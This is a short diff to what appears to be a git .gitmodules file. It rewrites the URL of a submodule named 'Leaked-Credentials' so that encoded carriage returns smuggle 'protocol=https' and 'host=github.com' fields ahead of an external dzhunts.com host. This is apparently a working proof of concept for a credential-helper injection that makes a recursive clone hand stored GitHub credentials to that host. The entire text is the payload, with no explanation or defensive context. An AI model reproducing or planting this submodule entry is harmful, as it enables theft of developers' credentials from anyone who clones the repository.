@@ -1,3 +1,3 @@
 [submodule "Leaked-Credentials"]
 	path = Leaked-Credentials
-	url = ssh://cuch501hpli8ian0r2u0h5at8d6j4hbyr.dzhunts.com/aaaaa/aaaaaaaaa
+	url = ssh://%0dprotocol=https%0dhost=github.com%0d@cuch501hpli8ian0r2u0h5at8d6j4hbyr.dzhunts.com/aaaaa/aaaaaaaaa
